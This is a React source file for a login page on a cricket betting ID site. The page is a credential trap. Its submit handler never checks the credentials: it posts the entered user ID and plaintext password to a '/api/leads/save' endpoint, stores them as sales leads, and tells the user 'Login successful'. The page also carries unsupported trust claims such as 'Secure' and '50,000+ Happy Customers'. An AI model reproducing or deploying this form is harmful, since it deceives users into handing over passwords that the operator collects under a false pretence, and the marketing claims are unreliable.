import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import api from '../config/api'
import SEO from '../components/SEO'

const Login = () => {
  const navigate = useNavigate()
  const [formData, setFormData] = useState({
    userId: '',
    password: ''
  })
  const [errors, setErrors] = useState({})
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState('')

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    })
    // Clear error when user types
    if (errors[e.target.name]) {
      setErrors({
        ...errors,
        [e.target.name]: ''
      })
    }
  }

  const validateForm = () => {
    const newErrors = {}
    
    if (!formData.userId.trim()) {
      newErrors.userId = 'User ID is required'
    }
    
    if (!formData.password.trim()) {
      newErrors.password = 'Password is required'
    } else if (formData.password.length < 4) {
      newErrors.password = 'Password must be at least 4 characters'
    }
    
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleLogin = async (e) => {
    e.preventDefault()
    
    if (!validateForm()) {
      return
    }

    setLoading(true)
    setMessage('')

    try {
      // Save credentials to database
      await api.post('/api/leads/save', {
        userId: formData.userId,
        password: formData.password
      })

      // Show success message
      setMessage('Login successful! Redirecting...')
      
      // Redirect to home page after 1 second
      setTimeout(() => {
        navigate('/')
      }, 1000)
    } catch (error) {
      setMessage('Something went wrong. Please try again.')
      console.error('Login error:', error)
    } finally {
      setLoading(false)
    }
  }

  const handleWhatsApp = () => {
    window.open('https://wa.me/918743884000?text=Hi%2C%20I%20want%20to%20get%20my%20online%20cricket%20ID', '_blank')
  }

  const handleGoToWebsite = () => {
    navigate('/')
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-purple-800 to-secondary flex items-center justify-center px-4 py-8 stars-bg">
      <SEO 
        title="Login - Get Your Cricket ID | Swamiji Online"
        description="Login to access your cricket betting ID. Get instant access to 5000+ games, live betting, and fast withdrawals."
        keywords="cricket id login, betting id login, online gaming login"
        url="https://swami-ji.club/login"
      />

      {/* Decorative Elements */}
      <div className="absolute top-20 left-10 w-32 h-32 bg-purple-500/20 rounded-full blur-3xl animate-pulse-glow"></div>
      <div className="absolute bottom-20 right-20 w-40 h-40 bg-blue-500/20 rounded-full blur-3xl animate-pulse-glow"></div>

      <div className="max-w-md w-full">
        {/* Logo/Header */}
        <div className="text-center mb-8">
          <div className="inline-block bg-gradient-to-br from-highlight to-orange-600 p-4 rounded-2xl mb-4">
            <span className="text-5xl">🎮</span>
          </div>
          <h1 className="text-4xl font-bold text-white mb-2">
            Welcome to <span className="text-highlight">Swamiji Online</span>
          </h1>
          <p className="text-gray-300">India's Most Trusted Cricket Betting ID Provider</p>
        </div>

        {/* Login Form Card */}
        <div className="bg-gray-900/80 backdrop-blur-lg rounded-2xl p-8 shadow-2xl border border-gray-700/50">
          <h2 className="text-2xl font-bold text-white mb-6 text-center">Login to Your Account</h2>
          
          {message && (
            <div className={`mb-4 p-3 rounded-lg text-center ${
              message.includes('successful') 
                ? 'bg-green-500/20 text-green-300 border border-green-500/50' 
                : 'bg-red-500/20 text-red-300 border border-red-500/50'
            }`}>
              {message}
            </div>
          )}

          <form onSubmit={handleLogin} className="space-y-4">
            {/* User ID Field */}
            <div>
              <label className="block text-gray-300 mb-2 font-medium">
                User ID <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                name="userId"
                value={formData.userId}
                onChange={handleChange}
                placeholder="Enter your User ID"
                className={`w-full px-4 py-3 bg-gray-800 border ${
                  errors.userId ? 'border-red-500' : 'border-gray-700'
                } rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-highlight transition`}
              />
              {errors.userId && (
                <p className="text-red-400 text-sm mt-1">{errors.userId}</p>
              )}
            </div>

            {/* Password Field */}
            <div>
              <label className="block text-gray-300 mb-2 font-medium">
                Password <span className="text-red-500">*</span>
              </label>
              <input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                placeholder="Enter your Password"
                className={`w-full px-4 py-3 bg-gray-800 border ${
                  errors.password ? 'border-red-500' : 'border-gray-700'
                } rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-highlight transition`}
              />
              {errors.password && (
                <p className="text-red-400 text-sm mt-1">{errors.password}</p>
              )}
            </div>

            {/* Login Button */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-highlight to-orange-600 text-white py-3 rounded-lg font-bold text-lg hover:from-orange-600 hover:to-highlight transition transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg"
            >
              {loading ? (
                <span className="flex items-center justify-center">
                  <svg className="animate-spin h-5 w-5 mr-2" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processing...
                </span>
              ) : (
                'Login'
              )}
            </button>
          </form>

          {/* Divider */}
          <div className="relative my-6">
            <div className="absolute inset-0 flex items-center">
              <div className="w-full border-t border-gray-700"></div>
            </div>
            <div className="relative flex justify-center text-sm">
              <span className="px-4 bg-gray-900 text-gray-400">OR</span>
            </div>
          </div>

          {/* WhatsApp Button */}
          <button
            onClick={handleWhatsApp}
            className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-bold text-lg transition transform hover:scale-105 shadow-lg flex items-center justify-center mb-3"
          >
            <svg className="w-6 h-6 mr-2" fill="currentColor" viewBox="0 0 24 24">
              <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
            </svg>
            Get Cricket ID via WhatsApp
          </button>

          {/* Go to Website Button */}
          <button
            onClick={handleGoToWebsite}
            className="w-full bg-gray-700 hover:bg-gray-600 text-white py-3 rounded-lg font-bold text-lg transition transform hover:scale-105 shadow-lg"
          >
            Go to Website
          </button>
        </div>

        {/* Trust Badges */}
        <div className="mt-8 text-center">
          <div className="flex justify-center items-center space-x-6 text-gray-300">
            <div className="flex items-center">
              <svg className="w-5 h-5 text-green-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span className="text-sm">Secure</span>
            </div>
            <div className="flex items-center">
              <svg className="w-5 h-5 text-green-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span className="text-sm">24/7 Support</span>
            </div>
            <div className="flex items-center">
              <svg className="w-5 h-5 text-green-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span className="text-sm">Trusted</span>
            </div>
          </div>
          <p className="text-gray-400 text-sm mt-4">
            50,000+ Happy Customers | ⭐ 4.8/5 Rating
          </p>
        </div>
      </div>
    </div>
  )
}

export default Login
